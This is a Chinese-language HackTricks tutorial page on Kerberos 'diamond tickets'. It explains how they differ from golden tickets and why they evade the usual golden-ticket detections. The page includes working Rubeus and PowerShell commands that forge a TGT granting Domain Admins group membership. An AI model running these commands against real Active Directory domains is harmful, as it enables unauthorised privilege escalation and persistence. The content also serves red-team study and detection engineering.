# 钻石票据

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库**提交PR来分享您的黑客技巧**。

</details>

## 钻石票据

**像金票一样**，钻石票据是一种TGT，可以用来**作为任何用户访问任何服务**。金票是完全离线伪造的，用该域的krbtgt哈希加密，然后传入登录会话中使用。因为域控制器不跟踪它们合法发出的TGTs，所以它们会愉快地接受用自己的krbtgt哈希加密的TGTs。

检测使用金票的两种常见技术是：

* 寻找没有对应AS-REQ的TGS-REQs。
* 寻找具有荒谬值的TGTs，例如Mimikatz默认的10年寿命。

**钻石票据**是通过**修改由DC发出的合法TGT的字段**来制作的。这是通过**请求**一个**TGT**，**用域的krbtgt哈希解密**它，**修改**票据的所需字段，然后**重新加密**它来实现的。这**克服了金票的两个上述缺点**，因为：

* TGS-REQs将有一个前置的AS-REQ。
* TGT是由DC发出的，这意味着它将具有域的Kerberos策略中的所有正确细节。即使这些可以在金票中准确伪造，但它更复杂且容易出错。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
```markdown
<details>

<summary><strong>从零到英雄学习AWS黑客攻击与</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
```
